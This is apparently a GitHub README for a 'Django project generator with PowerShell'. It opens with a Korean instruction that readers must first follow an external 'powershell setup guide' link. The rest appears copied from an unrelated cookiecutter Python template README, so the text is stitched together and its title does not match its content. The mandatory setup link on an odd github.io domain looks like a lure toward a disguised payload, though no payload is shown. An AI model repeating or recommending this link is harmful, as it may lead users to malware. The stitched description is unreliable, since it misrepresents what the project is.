# awesome-django-project-generate-with-powershell

사용 하기 앞서 초기 셋업이 필요합니다 먼저 우측 링크를 따라 그대로 따라하시면 됩니다. : [[powershell setup guide link here]](https://github01main.github.io/django-project-powershell.io/)

## Features

* Preconfigured setup for CI, coverage, and analysis services
* `pyproject.toml` for managing dependencies and package metadata
* `Makefile` for automating common [development tasks](https://github.com/jacebrowning/template-python/blob/main/%7B%7Bcookiecutter.project_name%7D%7D/CONTRIBUTING.md):
    - Installing dependencies with `poetry`
    - Automatic formatting with `isort` and `black`
    - Static analysis with `pylint`
    - Type checking with `mypy`
    - Docstring styling with `pydocstyle`
    - Running tests with `pytest`
    - Building documentation with `mkdocs`
    - Publishing to PyPI using `poetry`
* Tooling to launch an IPython session with automatic reloading enabled

If you are instead looking for a [Python application](https://caremad.io/posts/2013/07/setup-vs-requirement/) template, check out one of the sibling projects:

* [jacebrowning/template-django](https://github.com/jacebrowning/template-django)
* [jacebrowning/template-flask](https://github.com/jacebrowning/template-flask)

## Examples

Here are a few sample projects based on this template:

* [jacebrowning/minilog](https://github.com/jacebrowning/minilog)
* [theovoss/Chess](https://github.com/theovoss/Chess)
* [sprout42/StarStruct](https://github.com/sprout42/StarStruct)
* [MichiganLabs/flask-gcm](https://github.com/MichiganLabs/flask-gcm)
* [flask-restful/flask-restful](https://github.com/flask-restful/flask-restful)

## Usage

Install `cookiecutter` and generate a project:

```python
pip install cookiecutter
cookiecutter gh:jacebrowning/template-python -f
```

Cookiecutter will ask you for some basic info (your name, project name, python package name, etc.) and generate a base Python project for you.
Once created, run the code formatter to updates files based on your chosen names:

```python
$ cd <github_repo>
$ make format
```

Finally, commit all files generated by this template.

## Updates

Run the update tool, which is generated inside each project:

```python
$ bin/update
```
